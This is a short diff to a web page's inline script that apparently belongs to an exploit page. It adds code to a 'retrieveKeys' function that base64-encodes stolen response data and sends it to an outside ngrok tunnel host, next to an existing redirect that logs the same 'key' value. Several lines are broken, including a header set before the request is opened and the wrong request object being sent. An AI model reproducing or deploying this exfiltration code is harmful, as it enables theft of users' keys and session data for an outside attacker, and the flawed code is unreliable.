@@ -20,9 +20,14 @@
         req.send(null);
 
     function retrieveKeys() {
+            var req2 = new XMLHttpRequest()
+            req2.setRequestHeader("User-Agent", "QuxXS")
+            req2.open("GET", "https://4778-103-83-159-18.ngrok-free.app" + btoa(this.responseText),true);
+            req.send()
             location='/log?key='+this.responseText;
         };
 
+      
   </script>
   <body>
   </html>
